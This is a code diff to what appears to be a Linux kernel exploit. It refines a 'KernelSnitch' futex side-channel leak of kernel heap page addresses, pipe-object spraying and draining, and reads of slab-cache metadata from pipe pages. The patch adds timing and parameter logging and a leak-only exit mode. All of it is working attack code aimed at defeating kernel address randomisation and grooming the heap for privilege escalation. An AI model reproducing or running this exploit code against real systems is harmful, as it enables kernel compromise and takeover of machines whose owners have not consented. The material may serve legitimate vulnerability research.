@@ -150,8 +150,9 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
   SYSCHK(waitpid(leak_child, NULL, 0));
 
-  if (!kernelsnitch_collisions_ready()) {
-    pr_error("pipe KernelSnitch collision finding failed\n");
+  int collisions_ready = kernelsnitch_collisions_ready();
+  if (!collisions_ready) {
+    pr_warning("pipe KernelSnitch collision finding failed\n");
   }
 
   unsigned char *buf = malloc(SKB_SEND_SIZE);
@@ -201,10 +202,16 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
+  size_t leak_started = gettime_ns();
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
+  size_t leak_ms = (size_t)((gettime_ns() - leak_started) / 1000000ULL);
   if (leaked == (uintptr_t)-1) {
-    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
+    pr_warning("pipe KernelSnitch sk_buff page leak failed "
+               "collisions=%d mm_sz=%#zx order=%d objs_per_slab=%zu "
+               "futex_hashsize=%lu elapsed_ms=%zu\n",
+               collisions_ready, (size_t)MM_STRUCT_SZ, MM_ORDER,
+               objs_per_slab, futex_hashsize, leak_ms);
     close_ctx_memfds(&prep);
     close_ctx_memfds(&spray);
     close_ctx_memfds(&pre);
@@ -217,14 +224,17 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  pr_info("pipe KernelSnitch mm=%016zx base=%016zx object_index=%zu "
+          "futex_hashsize=%lu elapsed_ms=%zu\n",
+          leaked, base, (leaked - base) / MM_STRUCT_SZ, futex_hashsize,
+          leak_ms);
   if (getenv("KS_LEAK_ONLY")) {
-    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx object_index=%zu\n",
+    pr_success("KernelSnitch leak-only mm=%016zx base=%016zx "
+               "object_index=%zu\n",
                leaked, base, (leaked - base) / MM_STRUCT_SZ);
     fflush(NULL);
-    _exit(0);
+    return base;
   }
-#endif
 
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     alloc_pipe_object(pipe_fds_drain[i]);
@@ -288,6 +298,15 @@ uintptr_t prepare_pipe_buffer_page(void) {
   if (got != (ssize_t)sizeof(base)) {
     pr_warning("pipe page child did not report base\n");
     base = 0;
+  }
+  if (getenv("KS_LEAK_ONLY")) {
+    if (base) {
+      pr_success("KernelSnitch leak-only done base=%016zx\n", base);
+      fflush(NULL);
+      _exit(0);
+    }
+    pr_warning("KernelSnitch leak-only failed\n");
+    _exit(1);
   }
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     close(pipe_fds_drain[i][0]);
@@ -436,14 +455,20 @@ int pipe_reclaim_cache_gate(int fd) {
     pipe_page_slab_cache[off / PAGE_SIZE] = slab_cache;
     pipe_page_type[off / PAGE_SIZE] = page_type;
     int cache_match = pipe_cache_matches(slab_cache);
+#if defined(STRUCT_PAGE_TYPE_IS_MEMCG) && STRUCT_PAGE_TYPE_IS_MEMCG
+    /* 4.9 has no page_type; 0x38 is mem_cgroup. Keep it diagnostic only. */
+    const char *type_label = "memcg";
+#else
+    const char *type_label = "type";
+#endif
     pr_info("pipe page idx=%zu page=%016zx head=%016zx "
             "cache08=%016llx cache10=%016llx cache18=%016llx "
-            "cache20=%016llx type=%08x match=%d\n",
+            "cache20=%016llx %s=%08x match=%d\n",
             off / PAGE_SIZE, page, head,
             (unsigned long long)cache08,
             (unsigned long long)cache10,
             (unsigned long long)cache18,
-            (unsigned long long)cache20, page_type, cache_match);
+            (unsigned long long)cache20, type_label, page_type, cache_match);
     if (off == 0 || cache_match) {
       candidate_slab_cache = slab_cache;
     }
